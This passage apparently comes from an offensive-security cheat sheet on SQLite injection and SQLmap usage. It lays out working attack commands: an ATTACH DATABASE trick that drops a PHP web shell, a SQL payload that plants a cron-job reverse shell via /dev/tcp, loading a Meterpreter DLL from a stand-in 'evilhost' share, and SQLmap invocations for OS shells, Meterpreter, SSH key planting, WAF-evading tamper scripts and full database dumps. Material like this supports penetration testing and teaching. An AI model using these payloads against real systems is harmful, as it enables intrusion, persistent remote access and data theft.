**Note:** Using `ATTACH DATABASE` to create a file comes with a drawback: SQLite will prepend its magic header bytes (`5351 4c69 7465 2066 6f72 6d61 7420 3300`, i.e., *"SQLite format 3"*). These bytes will corrupt most server-side scripts, but PHP is unusually tolerant: as long as a `<?php` tag appears anywhere in the file, the interpreter ignores any preceding garbage and executes the embedded code.

```ps1
file shell.php  
shell.php: SQLite 3.x database, last written using SQLite version 3051000, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
```

If uploading a PHP web shell isn’t possible but the service runs with root privileges, an attacker can use the same technique to create a cron job that triggers a reverse shell:

```sql
ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;
CREATE TABLE cron.tab (dataz text);
INSERT INTO cron.tab (dataz) VALUES (char(10) || '* * * * * root bash -i >& /dev/tcp/127.0.0.1/4242 0>&1' || char(10));--
```

This writes a new cron entry that runs every minute and connects back to the attacker.

### Load_extension

:warning: SQLite's ability to load external shared libraries (extensions) is disabled by default in most environments. When enabled, SQLite can load a compiled module using the `load_extension()` SQL function:

```sql
SELECT load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

In the sqlite3 command-line shell you can display runtime configuration with:

```sql
sqlite> .dbconfig
    load_extension on
```

If you see `load_extension on` (or off), that indicates whether the shell's runtime currently permits loading shared-library extensions.

A SQLite extension is simply a native shared library,typically a `.so` file on Linux or a `.dll` file on Windows, that exposes a special initialization function. When the extension is loaded, SQLite calls this function to register any new SQL functions, virtual tables, or other features provided by the module.

To compile a loadable extension on Linux, you can use:

```ps1
gcc -g -fPIC -shared demo.c -o demo.so
```

## SQLite File Manipulation

### SQLite Read File

SQLite does not support file I/O operations by default.

### SQLite Write File

```sql
SELECT writefile('/path/to/file', column_name) FROM table_name
```


---

# SQLmap

> SQLmap is a powerful tool that automates the detection and exploitation of SQL injection vulnerabilities, saving time and effort compared to manual testing. It supports a wide range of databases and injection techniques, making it versatile and effective in various scenarios.
> Additionally, SQLmap can retrieve data, manipulate databases, and even execute commands, providing a robust set of features for penetration testers and security analysts.
> Reinventing the wheel isn't ideal because SQLmap has been rigorously developed, tested, and improved by experts. Using a reliable, community-supported tool means you benefit from established best practices and avoid the high risk of missing vulnerabilities or introducing errors in custom code.
> However you should always know how SQLmap is working, and be able to replicate it manually if necessary.

## Basic Arguments For SQLmap

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

## Load A Request File

A request file in SQLmap is a saved HTTP request that SQLmap reads and uses to perform SQL injection testing. This file allows you to provide a complete and custom HTTP request, which SQLmap can use to target more complex applications.

```powershell
sqlmap -r request.txt
```

## Custom Injection Point

A custom injection point in SQLmap allows you to specify exactly where and how SQLmap should attempt to inject payloads into a request. This is useful when dealing with more complex or non-standard injection scenarios that SQLmap may not detect automatically.

By defining a custom injection point with the wildcard character '`*`' , you have finer control over the testing process, ensuring SQLmap targets specific parts of the request you suspect to be vulnerable.

```powershell
sqlmap -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
```

## Second Order Injection

A second-order SQL injection occurs when malicious SQL code injected into an application is not executed immediately but is instead stored in the database and later used in another SQL query.

```powershell
sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

## Getting A Shell

* SQL Shell:

    ```ps1
    sqlmap -u "http://example.com/?id=1"  -p id --sql-shell
    ```

* OS Shell:

    ```ps1
    sqlmap -u "http://example.com/?id=1"  -p id --os-shell
    ```

* Meterpreter:

    ```ps1
    sqlmap -u "http://example.com/?id=1"  -p id --os-pwn
    ```

* SSH Shell:

    ```ps1
    sqlmap -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
    ```

## Crawl And Auto-Exploit

This method is not advisable for penetration testing; it should only be used in controlled environments or challenges. It will crawl the entire website and automatically submit forms, which may lead to unintended requests being sent to sensitive features like "delete" or "destroy" endpoints.

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```

* `--batch` = Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
* `--crawl` = How deep you want to crawl a site
* `--forms` = Parse and test forms

## Proxy Configuration For SQLmap

To run SQLmap with a proxy, you can use the `--proxy` option followed by the proxy URL. SQLmap supports various types of proxies such as HTTP, HTTPS, SOCKS4, and SOCKS5.

```powershell
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://www.target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
```

* HTTP Proxy:

    ```ps1
    --proxy="http://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="http://user:pass@127.0.0.1:8080"
    ```

* SOCKS Proxy:

    ```ps1
    --proxy="socks4://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="socks4://user:pass@127.0.0.1:1080"
    ```

* SOCKS5 Proxy:

    ```ps1
    --proxy="socks5://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="socks5://user:pass@127.0.0.1:1080"
    ```

## Injection Tampering

In SQLmap, tampering can help you adjust the injection in specific ways required to bypass web application firewalls (WAFs) or custom sanitization mechanisms. SQLmap provides various options and techniques to tamper with the payloads being used for SQL injection.

### Suffix And Prefix

The `--suffix` and `--prefix` options allow you to specify additional strings that should be appended or prepended to the payloads generated by SQLMap. These options can be useful when the target application requires specific formatting or when you need to bypass certain filters or protections.

```powershell
sqlmap -u "http://example.com/?id=1"  -p id --suffix="-- "
```

* `--suffix=SUFFIX`: The `--suffix` option appends a specified string to the end of each payload generated by SQLMap.
* `--prefix=PREFIX`: The `--prefix` option prepends a specified string to the beginning of each payload generated by SQLMap.

### Default Tamper Scripts

A tamper script  is a script that modifies the SQL injection payloads to evade detection by WAFs or other security mechanisms. SQLmap comes with a variety of pre-built tamper scripts that can be used to automatically adjust payloads

```powershell
sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=<tamper-script-name>
```

Below is a table highlighting some of the most commonly used tamper scripts:

| Tamper | Description |
| --- | --- |
|0x2char.py | Replaces each (MySQL) 0xHEX encoded string with equivalent CONCAT(CHAR(),…) counterpart |
|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
|apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart|
|appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
|base64encode.py | Base64 all characters in a given payload  |
|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |
|bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |
|chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |
|charencode.py | URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54) |
|charunicodeencode.py | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054) |
|charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054) |
|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|
|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|
|commentbeforeparentheses.py | Prepends (inline) comment before parentheses (e.g. ( -> /**/() |
|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
|charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
|equaltolike.py | Replaces all occurrences of operator equal ('=') with operator 'LIKE'  |
|escapequotes.py | Slash escape quotes (' and ") |
|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
|halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
|htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;) |
|ifnull2casewhenisnull.py | Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart|
|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
|informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) "information_schema" identifier |
|least.py | Replaces greater than operator ('>') with 'LEAST' counterpart |
|lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -> select) |
|modsecurityversioned.py | Embraces complete query with versioned comment |
|modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
|multiplespaces.py | Adds multiple spaces around SQL keywords |
|nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters|
|overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
|overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |
|percentage.py | Adds a percentage sign ('%') infront of each character  |
|plus2concat.py | Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart |
|plus2fnconcat.py | Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart |
|randomcase.py | Replaces each keyword character with random case value |
|randomcomments.py | Add random comments to SQL keywords|
|securesphere.py | Appends special crafted string |
|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |
|space2comment.py | Replaces space character (' ') with comments |
|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n') |
|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n') |
|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') |
|space2plus.py |  Replaces space character (' ') with plus ('+')  |
|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and \|\|) |
|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
|uppercase.py | Replaces each keyword character with upper case value 'INSERT'|
|varnish.py | Append a HTTP header 'X-originating-IP' |
|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
|versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For' |

### Custom Tamper Scripts

When creating a custom tamper script, there are a few things to keep in mind. The script architecture contains these mandatory variables and functions:

* `__priority__`: Defines the order in which tamper scripts are applied.  This sets how early or late SQLmap should apply your tamper script in the tamper pipeline. Normal priority is 0 and the highest is 100.
* `dependencies()`: This function gets called before the tamper script is used.
* `tamper(payload)`: The main function that modifies the payload.

The following code is an example of a tamper script that replace instances like '`LIMIT M, N`' with '`LIMIT N OFFSET M`' counterpart:

```py
import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGH

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    retVal = payload

    match = re.search(r"(?i)LIMIT\s*(\d+),\s*(\d+)", payload or "")
    if match:
        retVal = retVal.replace(match.group(0), "LIMIT %s OFFSET %s" % (match.group(2), match.group(1)))

    return retVal
```

* Save it as something like: `mytamper.py`
* Place it inside SQLmap's `tamper/` directory, typically:

    ```ps1
    /usr/share/sqlmap/tamper/
    ```

* Use it with SQLmap

    ```ps1
    sqlmap -u "http://target.com/vuln.php?id=1" --tamper=mytamper
    ```

### Custom SQL Payload

The `--sql-query` option in SQLmap is used to manually run your own SQL query on a vulnerable database after SQLmap has confirmed the injection and gathered necessary access.

```ps1
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query="SELECT version()"
```

### Evaluate Python Code

The `--eval` option lets you define or modify request parameters using Python. The evaluated variables can then be used inside the URL, headers, cookies, etc.

Particularly useful in scenarios such as:

* **Dynamic parameters**: When a parameter needs to be randomly or sequentially generated.
* **Token generation**: For handling CSRF tokens or dynamic auth headers.
* **Custom logic**: E.g., encoding, encryption, timestamps, etc.

```ps1
sqlmap -u "http://example.com/vulnerable.php?id=1" --eval="import random; id=random.randint(1,10)"
sqlmap -u "http://example.com/vulnerable.php?id=1" --eval="import hashlib;id2=hashlib.md5(id).hexdigest()"
```

### Preprocess And Postprocess Scripts

```ps1
sqlmap -u 'http://example.com/vulnerable.php?id=1' --preprocess=preprocess.py --postprocess=postprocess.py
```

#### Preprocessing Script (preprocess.py)

The preprocessing script is used to modify the request data before it is sent to the target application. This can be useful for encoding parameters, adding headers, or other request modifications.

```ps1
--preprocess=preprocess.py    Use given script(s) for preprocessing (request)
```

**Example preprocess.py**:

```ps1
#!/usr/bin/env python
def preprocess(req):
    print("Preprocess")
    print(req)
```

#### Postprocessing Script (postprocess.py)

The postprocessing script is used to modify the response data after it is received from the target application. This can be useful for decoding responses, extracting specific data, or other response modifications.

```ps1
--postprocess=postprocess.py  Use given script(s) for postprocessing (response)
```

## Reduce Requests Number

The parameter `--test-filter` is helpful when you want to focus on specific types of SQL injection techniques or payloads. Instead of testing the full range of payloads that SQLMap has, you can limit it to those that match a certain pattern, making the process more efficient, especially on large or slow web applications.

```ps1
sqlmap -u "https://www.target.com/page.php?category=demo" -p category --test-filter="Generic UNION query (NULL)"
sqlmap -u "https://www.target.com/page.php?category=demo" --test-filter="boolean"
```

By default, SQLmap runs with level 1 and risk 1, which generates fewer requests. Increasing these values without a purpose may lead to a larger number of tests that are time-consuming and unnecessary.

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --level=1 --risk=1
```

Use the `--technique` option to specify the types of SQL injection techniques to test for, rather than testing all possible ones.

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --technique=B
```

## SQLmap Without SQL Injection

Using SQLmap without exploiting SQL injection vulnerabilities can still be useful for various legitimate purposes, particularly in security assessments, database management, and application testing.

You can use SQLmap to access a database via its port instead of a URL.

```ps1
sqlmap -d "mysql://user:pass@ip/database" --dump-all
```
